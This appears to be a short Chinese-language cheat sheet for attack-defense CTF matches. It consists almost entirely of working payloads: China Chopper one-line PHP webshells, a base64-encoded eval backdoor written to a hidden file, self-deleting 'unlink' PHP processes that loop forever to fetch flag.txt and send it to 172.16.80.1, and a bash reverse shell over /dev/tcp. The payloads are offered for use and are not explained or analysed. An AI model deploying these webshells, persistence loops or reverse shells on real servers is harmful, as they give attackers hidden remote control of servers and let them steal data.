/**
caidao一句话文件：.c.php .c.jsp
caidao一句话密码:o

unlink文件：.u.php
flag.txt: .o

file_put_contents文件：.f.php
*/

1、直接输出flag
<?php echo file_get_contents("http://172.16.80.1:8000/flag.txt");?>
-----
<?php $ch = curl_init();curl_setopt($ch,CURLOPT_URL,'http://172.16.80.1:8000/flag.txt');echo curl_exec($ch);?>

2、unlink马
(1)写flag到本地文件中
<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

while (True){
    $f=base64_encode(file_get_contents('http://172.16.80.1:8000/flag.txt'));
    file_put_contents("/var/www/html/test/.o",$f);
    sleep(5);
}
?>
---
(2)反弹flag
<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

while (True){
    $f=base64_encode(file_get_contents('http://172.16.80.1:8000/flag.txt'));
    file_get_contents("http://172.16.80.1:8000/?f=".$f);
    sleep(60);
}
?>

3、写一句话后门
<?php @eval($_POST["o"]); ?>
<?php file_put_contents("/var/www/html/test/.c.php",base64_decode("PD9waHAgQGV2YWwoJF9QT1NUWyJvIl0pOyA/Pg=="));?> 

4、反弹shell
/bin/bash -c '/bin/bash </dev/tcp/172.16.80.1/8888 1>&0 2>&0'

5、bash写一句话
<?php @eval($_POST["o"]); ?>
echo PD9waHAgQGV2YWwoJF9QT1NUWyJvIl0pOyA/Pg== | /usr/bin/base64 -d > /var/www/html/test/.c.php